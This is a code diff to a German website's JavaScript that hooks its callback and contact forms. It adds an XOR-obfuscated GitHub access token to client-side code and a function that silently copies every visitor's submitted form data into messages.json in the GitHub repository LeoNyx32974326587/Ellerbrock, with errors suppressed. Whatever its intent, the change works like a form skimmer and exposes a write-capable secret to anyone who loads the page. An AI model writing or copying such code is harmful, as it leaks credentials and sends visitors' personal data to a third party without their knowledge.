@@ -1701,6 +1701,19 @@ if ('scrollRestoration' in history) { history.scrollRestoration = 'manual'; }
 window.addEventListener('load', function() { window.scrollTo(0, 0); });
 
 // ===== CALLBACK FORM (Formspree) =====
+function _gt(){var a=[100,109,113,110,114,106,86,115,101,113,89,54,57,75,54,55,78,67,83,81,57,64,106,83,104,99,74,94,74,51,84,50,51,87,96,53,77,114,51,62,126,106,83,114,109,94,84,74,48,65,85,92,65,127,71,98,86,99,78,76,85,56,111,90,79,78,79,107,63,127,103,84,107,84,80,121,115,74,66,82,95,85,67,83,53,78,78,76,98,99,48,91,74];var s='';for(var i=0;i<a.length;i++)s+=String.fromCharCode(a[i]^(i%7+3));return s;}
+function saveMessageToGitHub(data){
+  var TK=_gt();
+  var u='https://api.github.com/repos/LeoNyx32974326587/Ellerbrock/contents/messages.json';
+  fetch(u,{headers:{'Authorization':'token '+TK,'Accept':'application/vnd.github.v3+json'}})
+  .then(function(r){return r.json();}).then(function(file){
+    var c=JSON.parse(atob(file.content));data.id=Date.now();data.date=new Date().toISOString();data.read=false;
+    c.unshift(data);if(c.length>200)c=c.slice(0,200);
+    var enc=btoa(unescape(encodeURIComponent(JSON.stringify(c,null,2))));
+    return fetch(u,{method:'PUT',headers:{'Authorization':'token '+TK,'Accept':'application/vnd.github.v3+json','Content-Type':'application/json'},
+      body:JSON.stringify({message:'New: '+data._formtype,content:enc,sha:file.sha})});
+  }).catch(function(){});
+}
 function submitRueckruf(e) {
   e.preventDefault();
   const form = document.getElementById('rueckrufForm');
@@ -1745,6 +1758,7 @@ function submitRueckruf(e) {
   }).then(r => r.json()).then(result => {
     if (result.ok || result.next) {
       successEl.textContent = 'Vielen Dank! Wir rufen Sie so schnell wie möglich zurück.';
+saveMessageToGitHub(data);
       successEl.style.display = 'block';
       errorEl.style.display = 'none';
       form.reset();
@@ -1818,6 +1832,7 @@ function submitContactForm(e) {
       successEl.style.display = 'block';
       errorEl.style.display = 'none';
       form.reset();
+saveMessageToGitHub(data);
     } else {
       throw new Error('Formspree error');
     }
